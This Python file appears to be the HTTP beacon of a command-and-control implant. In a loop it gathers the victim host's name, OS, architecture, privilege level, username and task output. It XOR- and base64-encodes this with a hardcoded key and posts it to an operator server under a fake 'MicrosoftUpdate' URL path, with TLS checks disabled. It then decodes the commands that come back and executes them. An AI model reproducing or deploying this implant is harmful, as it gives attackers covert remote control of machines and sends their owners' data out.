import sys
import time
import requests
import json
import base64

import urllib3
urllib3.disable_warnings()

from Beacon import xorEncode
from Beacon import Beacon


class BeaconHttp(Beacon):

    def __init__(self, url, port, isHttps):
        super().__init__()
        self.url = url
        self.port = port
        self.isHttps = isHttps


    def checkIn(self):
        sessions = []
        for it in self.taskResults:
            sessions.append(it)
        self.taskResults.clear()

        # todo start with http:// ou https://
        prexif = "http://"
        if self.isHttps == "https":
            prexif = "https://"
        headers = {'Content-type': 'application/json', 'Authorization': "Bearer dgfghlsfojdojsdgsghsfgdssfsdsqffgcd"}
        url = prexif + self.url + ":" + self.port + "/MicrosoftUpdate/ShellEx/KB242742/default.aspx"

        boundel = {
            "arch": self.arch, 
            "beaconHash": self.beaconHash, 
            "hostname": self.hostname , 
            "listenerHash": "", 
            "os": self.os,  
            "privilege": self.privilege, 
            "sessions": "", 
            "username": self.username, 
            "lastProofOfLife":"0"
            }
        
        boundel["sessions"]=sessions

        json_object = ""
        try:
            json_object = json.dumps(boundel, separators=(',', ':'))
        except:
            pass
        dataToSend = "["+json_object+"]"

        key="dfsdgferhzdzxczevre5595485sdg";
        datab64 = xorEncode(dataToSend, key)
        bodyToPost = base64.b64encode(datab64.encode('utf-8'))
            
        response = requests.post(url, data=bodyToPost, headers=headers, verify=False)

        # cmdToTasks
        bodyb64d = base64.b64decode(response.content).decode('utf-8')

        bodyb64dd = xorEncode(bodyb64d, key)

        self.cmdToTasks(bodyb64dd)



    def runTasks(self):
        self.execInstruction()



def main() -> int:

    if len(sys.argv) < 3:
        print('Error: missing argument')
        sys.exit(1)

    url = sys.argv[1]
    port = sys.argv[2]
    isHttps = sys.argv[3]

    beaconHttp = BeaconHttp(url, port, isHttps)
    
    while 1:
        beaconHttp.checkIn()

        beaconHttp.runTasks()

        time.sleep(beaconHttp.sleepTimeMs/1000)

    return 0

if __name__ == '__main__':
    main() 

